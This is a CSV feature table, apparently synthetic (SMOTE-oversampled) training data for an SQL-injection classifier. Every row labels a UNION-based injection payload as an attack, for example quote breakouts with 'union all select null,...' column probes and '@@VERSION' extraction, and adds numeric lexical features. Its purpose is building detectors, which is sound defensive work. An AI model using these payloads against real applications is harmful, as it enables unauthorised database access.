id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001691,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.7426864483560764,73.0,32.0,4.3666515735196345,43.17500997181956,2.412495014090217,17.0,10.412495014090219,0.5914384927646515,0.03304787690534547,0.2328767123287671,0.14263691800123585,-5.551115123125783e-17,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.4124950140902177,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.412495014090218
SMOTE_001692,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,0.7943528656696158,63.77921314001536,21.572428747689944,3.7601223581391285,13.999999999999998,27.42057001848044,12.717286243069834,9.641356878465082,0.22088857245010743,0.42489004336883884,0.20355460276186196,0.15066678141919182,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.7862143738449723,0.0,0.0,4.85514250462011,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001693,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,1.2331249606827188,69.31405637787176,20.68594362212824,3.5916077449295893,13.999999999999998,40.0,3.999999999999999,11.31405637787176,0.2019882423829804,0.5771092639513726,0.057710926395137266,0.16319156727050974,1.0,0.0,1.62811275574352,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,1.62811275574352,1.0,0.0,0.31405637787175994,0.68594362212824,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001694,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,0.5884914308571124,67.43591598801976,18.0,3.57713571314499,13.999999999999998,38.609703100462,3.999999999999999,10.82621288755775,0.2081877237120105,0.5716504527563016,0.059482206774860144,0.16067961675682788,-5.551115123125783e-17,0.17378711244224962,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.6524257751155,3.0,0.0,0.17378711244224962,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001695,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000013,1.4793393014159457,56.0,19.83715122777111,3.5999847021728586,20.977092633373353,14.476468331912761,12.255726841656662,8.290712193057223,0.3745909398816671,0.25850836306987074,0.21885226502958324,0.148048432018879,1.0,0.0,0.709287806942777,0.0,0.0,0.0,0.0,1.7092878069427768,0.290712193057223,0.0,3.581424386114446,0.7092878069427768,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001696,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,2.3009908068223988,77.5634688740776,26.955772374604685,4.023556406120115,40.34807587513177,5.088455250790629,20.215392998945827,11.91154474920937,0.5214567320286708,0.06736061873990026,0.25895062599518515,0.15223202323624369,2.3038482497364563,0.0,2.0,0.0,0.6519241248682284,1.0,0.0,1.6519241248682284,0.0,0.0,1.3480758751317716,4.651924124868229,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.6519241248682284,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.651924124868228
SMOTE_001697,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.9962835905065529,58.117626866825276,19.207841791121684,3.6755636808705243,13.999999999999998,30.49410149346022,3.999999999999999,9.623525373365055,0.2432086295751808,0.5220472804855076,0.06948817987862307,0.16525591006068846,0.20784179112168485,0.7921582088783151,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.623525373365054,3.0,0.20784179112168485,0.7921582088783151,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001698,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000015,1.3784179981619076,65.76618057508142,19.717745371672095,3.7008824234927564,13.999999999999998,36.61294446006514,3.999999999999999,11.153236115016284,0.21539570699970392,0.5538334777146241,0.06154163057134397,0.16922918471432802,0.717745371672095,0.28225462832790515,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.153236115016284,3.0,0.717745371672095,0.28225462832790515,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001699,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.04879988130755651,73.0508313994117,31.025415699705853,4.3365591631942655,44.0,2.0,17.0,10.050831399411706,0.6023312179773306,0.0273786917262423,0.23271887967305954,0.13757121062336758,-5.551115123125783e-17,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,5.050831399411706,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001700,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,2.5456596720916815,58.63705575594143,22.36294424405857,3.953057572394386,19.44416366087858,21.10405936288713,10.903553952468577,7.18527877970714,0.33263789462555704,0.35865047961542396,0.18650299156870676,0.12220863419031222,-5.551115123125783e-17,1.0,0.637055755941428,0.0,0.0,0.36294424405857206,0.0,1.0,0.0,0.0,3.18527877970714,1.0,0.0,1.0,0.0,1.0,0.0,0.36294424405857206,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.36294424405857206,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.362944244058572
SMOTE_001701,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,1.3670388693163267,73.0,31.298231754400263,4.3462434584799645,43.40353649119947,2.2982317544002644,17.0,10.298231754400264,0.5945689930301297,0.03148262677260638,0.2328767123287671,0.14107166786849676,-5.551115123125783e-17,0.0,2.0,0.0,1.7017682455997352,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.29823175440026484,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.298231754400264
SMOTE_001702,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.434040411187649,73.0,31.335179671164283,4.3195975891752925,41.791897458895534,4.2486152466267875,16.58379491779107,10.375692376686606,0.5724917460122676,0.05820020885790117,0.227175272846453,0.14213277228337817,0.20810254110446444,0.0,2.0,0.0,0.7918974588955355,1.0,0.0,0.20810254110446447,0.0,0.0,1.2081025411044646,4.791897458895535,0.20810254110446444,0.0,1.0,0.0,0.0,1.0,0.2081025411044644,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.7918974588955354,0.0,0.7918974588955354,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.583794917791071
SMOTE_001703,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,2.0156890921519497,64.61025130136404,20.59743717465899,3.7476288989663753,13.999999999999998,24.0,15.610251301364052,11.0,0.21688142188602302,0.37179672323318236,0.24091502339891935,0.17040683148187524,0.40256282534101273,0.597437174658987,3.0,0.0,0.0,0.0,0.0,2.402562825341013,0.5974371746589873,0.0,4.0,3.0,0.40256282534101284,0.597437174658987,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001704,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,1.555327880517374,67.8755773121651,19.708140895944968,3.6299280973454993,13.999999999999998,28.66974566488053,13.913972543229535,11.291859104055034,0.20634156026219372,0.4204390413763397,0.20692447095467104,0.16629492740679555,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.1244226878349006,0.0,0.0,5.1674364162201325,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.7081408959449669,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001705,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.7984182054318885,80.7411837776063,16.0,3.0849418171949314,48.88105224676114,1.0,18.0,12.860131530845143,0.6049427155619945,0.012405415339524523,0.22329747611144116,0.15935439298703977,0.8601315308451434,0.13986846915485668,0.279736938309713,0.0,0.0,0.0,0.0,3.0,0.0,0.0,7.720263061690287,0.27973693830971325,0.8601315308451434,0.13986846915485668,0.1398684691548565,0.8601315308451436,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001706,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.072542120537655,62.85058693287185,18.0,3.5421102998062137,13.999999999999998,34.53385505144164,3.999999999999999,10.316731881430206,0.22369366737676188,0.5480223481242994,0.06391247639336053,0.1643715081055782,-5.551115123125783e-17,0.6832681185697947,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.63346376286041,3.0,0.0,0.6832681185697947,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001707,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000016,2.421206110768581,61.38310217435427,15.615492701831837,3.125891974525421,45.0760583853453,1.0,5.5380291926726475,9.769014596336325,0.7362675964939942,0.016483902506542275,0.08790745563577837,0.15934104536368515,0.6154927018318378,0.0,0.7690145963363244,0.0,0.0,0.0,0.0,0.3845072981681621,0.6154927018318379,0.0,6.769014596336325,0.769014596336324,0.6154927018318379,0.0,0.3845072981681621,0.6154927018318379,0.0,0.0,0.38450729816816204,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001708,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.2346034606942686,73.0,32.0,4.365407936967109,43.415537118114024,2.292231440942988,17.0,10.292231440942986,0.5947333851796441,0.03140043069784915,0.2328767123287671,0.14098947179373955,-5.551115123125783e-17,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.29223144094298703,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.292231440942987
SMOTE_001709,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,0.8801392952464291,70.92064471583325,20.473746966794884,3.679618635137314,13.999999999999998,36.21002426564091,9.421240900384658,11.289379549807672,0.1987396929504507,0.5056969444005535,0.13686456998267585,0.15869879266632006,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.236873483397443,0.0,0.0,7.052506066410228,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001710,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.34946935945278323,58.35345907210315,18.32930818557937,3.568055132762924,13.999999999999998,30.682767257682514,3.999999999999999,9.670691814420628,0.24031865848198666,0.5253501045920153,0.06866247385199617,0.1656687630740019,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.670691814420629,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001711,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.7255257192288248,80.85610881751491,16.0,3.083860518400316,48.98320783779103,1.0,18.0,12.872900979723878,0.6053821586740927,0.012386216368607567,0.2229518946349368,0.1592797303223629,0.8729009797238783,0.12709902027612163,0.25419804055224327,0.0,0.0,0.0,0.0,3.0,0.0,0.0,7.745801959447757,0.25419804055224304,0.8729009797238784,0.12709902027612163,0.12709902027612163,0.8729009797238785,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001712,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000016,1.2467780031594209,56.0,16.488052372663628,3.239734160416809,40.04779050934549,1.0,5.952209490654514,9.0,0.7151391162383123,0.01785714285714285,0.10628945519025919,0.16071428571428573,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.48805237266362866,1.0,0.0,5.5119476273363714,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.4880523726636286,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001713,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.03935744363596523,74.95900412288583,31.979502061442915,4.395511924427202,44.0,2.0,17.0,11.959004122885835,0.5869961312498673,0.0266816423295394,0.22679395980108508,0.15952826661950825,-5.551115123125783e-17,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,6.959004122885835,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001714,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,1.2426702157033003,70.33112392194481,20.73377521561104,3.5643770862797086,13.999999999999998,40.0,5.064899137555846,11.266224784388962,0.19924877890575257,0.5692822254450074,0.07131875143039057,0.16015024421884946,0.7337752156110382,0.2662247843889619,1.0,0.0,0.0,0.0,0.0,0.2662247843889619,0.0,0.0,8.0,1.0,0.7337752156110382,0.2662247843889619,0.0,1.0,0.0,0.0,0.2662247843889619,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001715,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000022,2.543070565984622,62.15253471032188,23.0,3.8778070474003794,32.11440103274141,9.0,14.96186632241953,6.076267355160941,0.5157292981451587,0.14540940115128084,0.24277630390156285,0.09608499680199767,-5.551115123125783e-17,1.0,1.038133677580471,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.5572005163707066,2.0381336775804706,0.0,1.0,0.5190668387902354,0.4809331612097646,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001716,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,1.0508879439235974,67.17709715692948,15.0,3.0300397555585254,50.0,1.0,5.1770971569294755,11.0,0.7448366108557416,0.014896732217114794,0.07640260253888041,0.16386405438826315,0.7057257107676309,0.0,2.0,0.0,0.0,0.0,0.0,0.294274289232369,0.0,0.0,8.0,2.0,0.705725710767631,0.0,1.0,0.0,0.0,0.0,0.2942742892323689,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001717,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,2.0456928374114707,71.60804199914239,15.536013999714129,3.1080223815181482,45.71188800228698,1.0,13.36013999714128,11.536013999714129,0.6398101879066476,0.013971028962985854,0.18519480700719188,0.1610239761231747,-5.551115123125783e-17,0.5360139997141279,2.0,0.0,0.0,0.0,0.0,2.072027999428256,0.0,0.0,6.927972000571744,2.0,0.0,0.5360139997141279,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001718,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,0.6404893851028935,61.95875497553661,20.73968874388415,3.8097344592682605,13.999999999999998,24.520622512231697,12.69844371942076,10.739688743884152,0.2264292728261147,0.397630331560669,0.20276461317921943,0.17317578243399678,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.0,0.0,1.739688743884152,0.869844371942076,0.0,4.130155628057924,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.869844371942076,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001719,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.0389475409967635,73.0,32.24562560559317,4.371655458180162,43.50874878881366,2.245625605593169,17.0,10.245625605593169,0.596010257381009,0.03076199459716672,0.2328767123287671,0.14035103569305712,-5.551115123125783e-17,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.24562560559316976,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.24562560559317
SMOTE_001720,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,0.025221163104954102,63.075103797735245,21.013253611365045,3.831150126325805,14.022089352275072,24.053014445460175,14.0,11.0,0.22228971746528495,0.38125742438856053,0.22201360056184652,0.17443925758430798,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.0044178704550145165,0.0,1.9955821295449856,0.9955821295449855,0.0,4.004417870455015,3.004417870455015,0.0,1.0,1.0,0.0,0.0,0.0044178704550145165,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0044178704550145165,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0044178704550144
SMOTE_001721,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,2.3090034998718445,78.35953809240826,16.0,3.1073500809697645,46.76403385991845,1.0,18.0,12.595504232489805,0.595835929150167,0.012803284648779084,0.23045912367802396,0.16090166252302987,0.5955042324898058,0.40449576751019434,0.8089915350203885,0.0,0.0,0.0,0.0,3.0,0.0,0.0,7.191008464979611,0.8089915350203885,0.5955042324898057,0.40449576751019434,0.40449576751019417,0.5955042324898059,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001722,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000021,1.8071837028239566,57.93794258363001,19.7344856459075,3.7262466791713313,13.999999999999998,26.531028708184994,7.672428229537513,9.734485645907503,0.24267497946008076,0.46203295428817726,0.12762821999712645,0.16766384625461545,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.0,0.0,0.7344856459075028,0.3672428229537513,0.0,4.632757177046249,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3672428229537513,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
